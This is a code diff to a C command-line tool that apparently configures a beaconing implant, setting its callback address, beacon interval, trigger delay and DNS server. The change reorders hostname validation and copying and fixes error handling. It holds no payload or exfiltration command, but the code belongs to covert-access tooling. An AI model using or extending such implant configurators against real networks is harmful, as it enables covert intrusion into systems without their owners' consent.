@@ -87,6 +87,7 @@ struct cl_args args = {
 		{0},
 		{0},
 		{0},
+		{0},
 		DEFAULT_INITIAL_DELAY,
 		DEFAULT_BEACON_INTERVAL,
 		DEFAULT_TRIGGER_DELAY,
@@ -201,14 +202,7 @@ int main(int argc, char **argv)
 				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
 				return -1;
 			}
-
-			host = optarg;	// save pointer to the unmodified user input.  this is echo'd back to user
-
-			RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// fill/initialize structure with random data
-
-			args.host_len = strlen(optarg);
-			memcpy(args.beacon_ip, optarg, strlen(optarg));	// copy string representation of hostname or IP into the structure
-
+			host = optarg;	// Save domain name or IP address for processing below
 			break;
 
 		case 'd':	// initial delay
@@ -364,7 +358,7 @@ int main(int argc, char **argv)
 			{
 			char *address;
 
-			address = asloc(optarg);
+			address = optarg;
 			if (strlen(address) > 16) {
 				fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
 				return -1;
@@ -394,11 +388,16 @@ int main(int argc, char **argv)
 		return -1;
 	}
 
-	{
-		struct in_addr	beaconIPaddr = 0;
-		if (strlen(dns_ip) == 0 && inet_pton(AF_INET, args.beacon_ip, &beaconIPaddr) == 0) {
+	{	// Validate IP addressing - must have a valid IP or a domain name
+		uint32_t	beaconIPaddr = 0;
+		if (strlen(dns_ip) == 0 && inet_pton(AF_INET, host, &beaconIPaddr) == 0) {
 			printf("%sError: The beacon address is invalid, or no DNS server address was specified.%s\n", RED, RESET);
+			return -1;
 		}
+
+		RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// Fill/initialize field with random data
+		args.host_len = strlen(host);
+		memcpy(args.beacon_ip, host, args.host_len);		// Copy string representation of hostname or IP into the field
 	}
 
 	if (raw == 0) {
